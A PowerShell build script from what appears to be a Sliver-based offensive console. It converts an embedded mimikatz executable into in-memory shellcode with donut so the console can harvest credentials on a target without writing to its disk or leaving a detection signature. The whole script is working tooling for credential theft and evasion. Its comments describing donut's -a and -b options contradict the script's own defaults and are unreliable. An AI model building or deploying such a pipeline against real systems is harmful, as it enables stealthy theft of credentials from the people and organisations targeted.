# build-mimikatz-shellcode.ps1
#
# Converts the embedded mimikatz executable into position-independent shellcode
# so the credential-harvest panel can run it without writing anything to the
# target's disk.
#
# Why this exists
# ---------------
# An EXE cannot be reflectively loaded. It has no export table, and its entry
# point assumes it owns the process it was started in. Sliver can execute a .NET
# assembly and a DLL it converts with sRDI, but for a native executable the only
# way in is to convert it first. Donut does that conversion offline; this script
# runs it and drops the result where the build expects to find it:
#
#     internal/embed/mimikatz/mimikatz.x64.bin
#
# build-release.ps1 picks the file up automatically. When it is absent, the build
# still succeeds and the console falls back to uploading mimikatz to the target's
# temp directory — which works, it just leaves a file behind.
#
# Usage
# -----
#     build\build-mimikatz-shellcode.ps1                     # uses donut from PATH
#     build\build-mimikatz-shellcode.ps1 -DonutPath .\donut.exe
#
# Donut is at https://github.com/TheWover/donut. This script does not download
# it: a build step that fetches and runs a binary from the internet is not one to
# put in a repository unattended.

[CmdletBinding()]
param(
    # Path to donut.exe. Defaults to a copy in tools\ or one on PATH.
    [string]$DonutPath = '',

    # The mimikatz executable to convert. Defaults to the embedded one.
    [string]$InputExe = '',

    # Where to write the shellcode. Defaults to the path the build embeds.
    [string]$OutFile = '',

    # Donut's -e exit option, kept at 2 by default: a process that stays alive
    # holds whatever handle an operator's console has on it.
    [int]$ExitCode = 2,

    # ------------------------------------------------------------------------
    # Donut parameters.
    #
    # The defaults below matter more than they look. Donut's -a 3 (or /a 3,
    # depending on build) selects the shellcode that requires no arguments to be
    # passed at execution time, which is the only form Sliver's injection can
    # provide: it starts a thread at the shellcode and hands it nothing.
    #
    # -b 2 tells donut the input is an EXE (1 = .NET assembly, 2 = native).
    # Getting this wrong produces a blob that decrypts and then does nothing,
    # which is the least debuggable failure this pipeline can produce.
    # ------------------------------------------------------------------------
    [int]$Arch = 3,
    [int]$Bypass = 3,
    [int]$Format = 2,
    [switch]$KeepHeaders,

    # Regenerate even when the output already exists.
    [switch]$Force
)

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

function Step($msg) { Write-Host "`n=== $msg ===" -ForegroundColor Cyan }
function Info($msg) { Write-Host "    $msg" }
function Fail($msg) { Write-Host "    $msg" -ForegroundColor Red; exit 1 }

$repoRoot = Split-Path -Parent $PSScriptRoot

if (-not $InputExe) {
    $InputExe = Join-Path $repoRoot 'internal\embed\mimikatz\mimikatz.x64.exe'
}
if (-not $OutFile) {
    $OutFile = Join-Path $repoRoot 'internal\embed\mimikatz\mimikatz.x64.bin'
}

# --- 1. locate donut ---------------------------------------------------------
Step 'locating donut'

if (-not $DonutPath) {
    $candidates = @(
        (Join-Path $repoRoot 'tools\donut\donut.exe'),
        (Join-Path $repoRoot 'tools\donut.exe'),
        (Join-Path $PSScriptRoot 'donut.exe')
    )
    foreach ($c in $candidates) {
        if (Test-Path $c) { $DonutPath = $c; break }
    }
}

if (-not $DonutPath) {
    $onPath = Get-Command donut.exe, donut -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($onPath) { $DonutPath = $onPath.Source }
}

if (-not $DonutPath) {
    Fail @'
donut was not found. Either put donut.exe in tools\donut\ or pass -DonutPath.
Get it from https://github.com/TheWover/donut/releases.
Without it the build still works; only the in-memory credential harvest is unavailable.
'@
}
if (-not (Test-Path $DonutPath)) { Fail "donut not found at $DonutPath" }
Info "donut   : $DonutPath"

# --- 2. check the input ------------------------------------------------------
Step 'checking the input'

if (-not (Test-Path $InputExe)) { Fail "input executable not found: $InputExe" }
$inLen = (Get-Item $InputExe).Length
Info ("input   : {0} ({1:N0} bytes)" -f $InputExe, $inLen)

# The DOS header check is not paranoia: donut given something that is not a PE
# fails inside its own loader with a message that points at the wrong thing.
$head = [System.IO.File]::ReadAllBytes($InputExe)[0..1]
if ($head[0] -ne 0x4D -or $head[1] -ne 0x5A) {
    Fail "$InputExe does not start with MZ, so it is not a PE image"
}

if ((Test-Path $OutFile) -and -not $Force) {
    $existing = Get-Item $OutFile
    if ($existing.LastWriteTimeUtc -gt (Get-Item $InputExe).LastWriteTimeUtc) {
        Info ("up to date: {0:N0} bytes, {1:u}" -f $existing.Length, $existing.LastWriteTimeUtc)
        Info 'use -Force to regenerate'
        exit 0
    }
}

# --- 3. convert --------------------------------------------------------------
Step 'converting with donut'

$outDir = Split-Path -Parent $OutFile
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Force -Path $outDir | Out-Null }

# donut writes "<input>.bin" next to the input unless -o is given, and it insists
# on the output directory existing. Both are handled explicitly so the result
# lands exactly where the //go:embed directive looks for it.
$donutArgs = @(
    '-i', $InputExe,
    '-o', $OutFile,
    '-a', $Arch,
    '-b', $Bypass,
    '-e', $ExitCode,
    '-f', $Format
)
if ($KeepHeaders) { $donutArgs += '-k', '1' } else { $donutArgs += '-k', '2' }

Info ('donut ' + ($donutArgs -join ' '))

$log = Join-Path $env:TEMP ("donut-" + [Guid]::NewGuid().ToString('N') + '.log')
& $DonutPath @donutArgs *>&1 | Tee-Object -FilePath $log
$code = $LASTEXITCODE

if ($code -ne 0) {
    Write-Host ''
    Get-Content $log -Tail 25 | ForEach-Object { Info $_ }
    Remove-Item $log -Force -ErrorAction SilentlyContinue
    Fail "donut exited with $code"
}
Remove-Item $log -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $OutFile)) {
    Fail "donut reported success but $OutFile does not exist"
}

# A zero-length blob would satisfy //go:embed and then make every in-memory run
# silently fall back to the disk path, which is the exact failure this script
# exists to prevent. Catch it here rather than in an engagement.
$outLen = (Get-Item $OutFile).Length
if ($outLen -lt 4096) {
    Fail "the generated blob is only $outLen bytes, which is too small to be shellcode"
}

# --- 4. report ---------------------------------------------------------------
Step 'done'

Write-Host ''
Write-Host ("  input  : {0} ({1:N0} bytes)" -f (Split-Path -Leaf $InputExe), $inLen)
Write-Host ("  output : {0} ({1:N0} bytes)" -f $OutFile, $outLen)
Write-Host ("  ratio  : {0:N2}x" -f ($outLen / $inLen))
Write-Host ''
Write-Host '  The release build picks this up automatically: build-release.ps1 adds the'
Write-Host '  mimikatzshellcode tag when this file is present, and the console then offers'
Write-Host '  内存加载 as a working execution mode for the built-in mimikatz.'
Write-Host ''
Write-Host '  internal/embed/mimikatz/*.bin is gitignored on purpose — it is a build'
Write-Host '  artifact, and a shellcode blob in a repository is a detection signature.'
Write-Host ''
